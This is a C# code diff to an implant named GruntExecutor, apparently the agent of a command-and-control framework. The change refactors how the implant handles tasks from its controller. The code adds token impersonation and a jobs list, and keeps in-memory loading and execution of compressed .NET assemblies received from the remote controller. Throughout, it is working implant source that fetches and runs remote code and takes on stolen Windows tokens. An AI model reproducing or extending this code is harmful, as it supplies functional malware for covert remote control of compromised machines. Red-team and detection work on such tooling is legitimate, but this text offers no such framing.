@@ -83,7 +83,7 @@ namespace GruntExecutor
                     new Profile(ProfileHttpGetResponse, ProfileHttpPostRequest, ProfileHttpPostResponse)
                 );
                 messenger.WriteTaskingMessage(RegisterBody);
-                messenger.SetAuthenticator(messenger.ReadTaskingMessage().message);
+                messenger.SetAuthenticator(messenger.ReadTaskingMessage().Message);
                 try
                 {
                     // A blank upward write, this helps in some cases with an HTTP Proxy
@@ -91,6 +91,8 @@ namespace GruntExecutor
                 }
                 catch (Exception) {}
 
+                List<KeyValuePair<string, Thread>> Jobs = new List<KeyValuePair<string, Thread>>();
+                WindowsImpersonationContext impersonationContext = null;
                 Random rnd = new Random();
                 int ConnectAttemptCount = 0;
                 bool alive = true;
@@ -103,73 +105,81 @@ namespace GruntExecutor
                         if (message != null)
                         {
                             ConnectAttemptCount = 0;
-                            new Thread(() =>
+                            string output = "";
+                            if (message.Type == GruntTaskingType.SetDelay || message.Type == GruntTaskingType.SetJitter || message.Type == GruntTaskingType.SetConnectAttempts)
                             {
-                                string output = "";
-                                try
+                                if (int.TryParse(message.Message, out int val))
                                 {
-                                    if (message.type == GruntTaskingType.Assembly)
+                                    if (message.Type == GruntTaskingType.SetDelay)
                                     {
-                                        string[] pieces = message.message.Split(',');
-                                        if (pieces.Length > 0)
-                                        {
-                                            object[] parameters = null;
-                                            if (pieces.Length > 1) { parameters = new object[pieces.Length - 1]; }
-                                            for (int i = 1; i < pieces.Length; i++) { parameters[i - 1] = Encoding.UTF8.GetString(Convert.FromBase64String(pieces[i])); }
-                                            byte[] compressedBytes = Convert.FromBase64String(pieces[0]);
-                                            byte[] decompressedBytes = Utilities.Decompress(compressedBytes);
-                                            Assembly gruntTask = Assembly.Load(decompressedBytes);
-                                            var results = gruntTask.GetType("Task").GetMethod("Execute").Invoke(null, parameters);
-                                            if (results != null) { output += (string)results; }
-                                        }
+                                        Delay = val;
+                                        output += "Set Delay: " + Delay;
                                     }
-                                    else if (message.type == GruntTaskingType.Set)
+                                    else if (message.Type == GruntTaskingType.SetJitter)
                                     {
-                                        GruntSetTaskingType type = (GruntSetTaskingType)Enum.Parse(typeof(GruntSetTaskingType), message.message.Substring(0, message.message.IndexOf(',')));
-                                        String val = message.message.Substring(message.message.IndexOf(',') + 1);
-                                        if (type == GruntSetTaskingType.Delay)
-                                        {
-                                            Delay = int.Parse(val);
-                                            output += "Set Delay: " + Delay;
-                                        }
-                                        else if (type == GruntSetTaskingType.Jitter)
-                                        {
-                                            Jitter = int.Parse(val);
-                                            output += "Set Jitter: " + Jitter;
-                                        }
-                                        else if (type == GruntSetTaskingType.ConnectAttempts)
-                                        {
-                                            ConnectAttempts = int.Parse(val);
-                                            output += "Set ConnectAttempts: " + ConnectAttempts;
-                                        }
+                                        Jitter = val;
+                                        output += "Set Jitter: " + Jitter;
                                     }
-                                    else if (message.type == GruntTaskingType.Kill)
+                                    else if (message.Type == GruntTaskingType.SetConnectAttempts)
                                     {
-                                        output += "Killed";
-                                    }
-                                    else if (message.type == GruntTaskingType.Connect)
-                                    {
-                                        string[] split = message.message.Split(',');
-                                        bool connected = messenger.Connect(split[0], split[1]);
-                                        output += connected ? "Connection to " + split[0] + ":" + split[1] + " succeeded!" :
-                                                              "Connection to " + split[0] + ":" + split[1] + " failed.";
-                                    }
-                                    else if (message.type == GruntTaskingType.Disconnect)
-                                    {
-                                        bool disconnected = messenger.Disconnect(message.message);
-                                        output += disconnected ? "Disconnect succeeded!" : "Disconnect failed.";
+                                        ConnectAttempts = val;
+                                        output += "Set ConnectAttempts: " + ConnectAttempts;
                                     }
                                 }
-                                catch (Exception e)
+                                else
                                 {
-                                    output += "Task Exception: " + e.Message + Environment.NewLine + e.StackTrace;
+                                    output += "Error parsing: " + message.Message.Split(',')[1];
                                 }
-                                finally
+                                messenger.WriteTaskingMessage(output, message.Name);
+                            }
+                            else if (message.Type == GruntTaskingType.Kill)
+                            {
+                                output += "Killed";
+                                messenger.WriteTaskingMessage(output, message.Name);
+                                return;
+                            }
+                            else if(message.Type == GruntTaskingType.Jobs)
+                            {
+                                if (!Jobs.Where(J => J.Value.IsAlive).Any()) { output += "No active tasks!"; }
+                                else
                                 {
-                                    messenger.WriteTaskingMessage(output, message.name);
+                                    output += "Task       Status" + Environment.NewLine;
+                                    output += "----       ------" + Environment.NewLine;
+                                    output += String.Join(Environment.NewLine, Jobs.Where(J => J.Value.IsAlive).Select(J => J.Key + " Active").ToArray());
                                 }
-                            }).Start();
-                            if (message.type == GruntTaskingType.Kill) { return; }
+                                messenger.WriteTaskingMessage(output, message.Name);
+                            }
+                            else if (message.Token)
+                            {
+                                if (impersonationContext != null)
+                                {
+                                    impersonationContext.Undo();
+                                }
+                                IntPtr impersonatedToken = IntPtr.Zero;
+                                Thread t = new Thread(() => impersonatedToken = TaskExecute(messenger, message));
+                                t.Start();
+                                Jobs.Add(new KeyValuePair<string, Thread>(message.Name, t));
+                                bool completed = t.Join(5000);
+                                if (completed && impersonatedToken != IntPtr.Zero)
+                                {
+                                    try
+                                    {
+                                        WindowsIdentity identity = new WindowsIdentity(impersonatedToken);
+                                        impersonationContext = identity.Impersonate();
+                                    }
+                                    catch (ArgumentException) { }
+                                }
+                                else
+                                {
+                                    impersonationContext = null;
+                                }
+                            }
+                            else
+                            {
+                                Thread t = new Thread(() => TaskExecute(messenger, message));
+                                t.Start();
+                                Jobs.Add(new KeyValuePair<string, Thread>(message.Name, t));
+                            }
                         }
                     }
                     catch (ObjectDisposedException e)
@@ -188,6 +198,50 @@ namespace GruntExecutor
             catch (Exception e) {
                 Console.Error.WriteLine("Outer Exception: " + e.Message + Environment.NewLine + e.StackTrace);
             }
+        }
+
+        private static IntPtr TaskExecute(TaskingMessenger messenger, GruntTaskingMessage message)
+        {
+            string output = "";
+            try
+            {
+                if (message.Type == GruntTaskingType.Assembly)
+                {
+                    string[] pieces = message.Message.Split(',');
+                    if (pieces.Length > 0)
+                    {
+                        object[] parameters = null;
+                        if (pieces.Length > 1) { parameters = new object[pieces.Length - 1]; }
+                        for (int i = 1; i < pieces.Length; i++) { parameters[i - 1] = Encoding.UTF8.GetString(Convert.FromBase64String(pieces[i])); }
+                        byte[] compressedBytes = Convert.FromBase64String(pieces[0]);
+                        byte[] decompressedBytes = Utilities.Decompress(compressedBytes);
+                        Assembly gruntTask = Assembly.Load(decompressedBytes);
+                        var results = gruntTask.GetType("Task").GetMethod("Execute").Invoke(null, parameters);
+                        if (results != null) { output += (string)results; }
+                    }
+                }
+                else if (message.Type == GruntTaskingType.Connect)
+                {
+                    string[] split = message.Message.Split(',');
+                    bool connected = messenger.Connect(split[0], split[1]);
+                    output += connected ? "Connection to " + split[0] + ":" + split[1] + " succeeded!" :
+                                          "Connection to " + split[0] + ":" + split[1] + " failed.";
+                }
+                else if (message.Type == GruntTaskingType.Disconnect)
+                {
+                    bool disconnected = messenger.Disconnect(message.Message);
+                    output += disconnected ? "Disconnect succeeded!" : "Disconnect failed.";
+                }
+            }
+            catch (Exception e)
+            {
+                output += "Task Exception: " + e.Message + Environment.NewLine + e.StackTrace;
+            }
+            finally
+            {
+                messenger.WriteTaskingMessage(output, message.Name);
+            }
+            return WindowsIdentity.GetCurrent().Token;
         }
     }
 
@@ -652,35 +706,33 @@ namespace GruntExecutor
     public enum GruntTaskingType
     {
         Assembly,
-        Set,
+        SetDelay,
+        SetJitter,
+        SetConnectAttempts,
         Kill,
         Connect,
-        Disconnect
-    }
-
-    public enum GruntSetTaskingType
-    {
-        Delay,
-        Jitter,
-        ConnectAttempts
+        Disconnect,
+        Jobs
     }
 
     public class GruntTaskingMessage
     {
-        public GruntTaskingType type { get; set; }
-        public String name { get; set; }
-        public String message { get; set; }
+        public GruntTaskingType Type { get; set; }
+        public string Name { get; set; }
+        public string Message { get; set; }
+        public bool Token { get; set; }
 
-        private static string GruntTaskingMessageFormat = @"{{""type"":""{0}"",""name"":""{1}"",""message"":""{2}""}}";
+        private static string GruntTaskingMessageFormat = @"{{""type"":""{0}"",""name"":""{1}"",""message"":""{2}"",""token"":{3}}}";
         public static GruntTaskingMessage FromJson(string message)
         {
             List<string> parseList = Utilities.Parse(message, GruntTaskingMessageFormat.Replace("{{", "{").Replace("}}", "}"));
             if (parseList.Count < 3)  { return null; }
             return new GruntTaskingMessage
             {
-				type = (GruntTaskingType) Enum.Parse(typeof(GruntTaskingType), parseList[0], true),
-                name = parseList[1],
-                message = parseList[2]
+				Type = (GruntTaskingType) Enum.Parse(typeof(GruntTaskingType), parseList[0], true),
+                Name = parseList[1],
+                Message = parseList[2],
+                Token = Convert.ToBoolean(parseList[3])
             };
         }
 
@@ -688,9 +740,10 @@ namespace GruntExecutor
         {
             return String.Format(
                 GruntTaskingMessageFormat,
-                message.type.ToString("D"),
-                Utilities.JavaScriptStringEncode(message.name),
-                Utilities.JavaScriptStringEncode(message.message)
+                message.Type.ToString("D"),
+                Utilities.JavaScriptStringEncode(message.Name),
+                Utilities.JavaScriptStringEncode(message.Message),
+                message.Token
             );
         }
     }
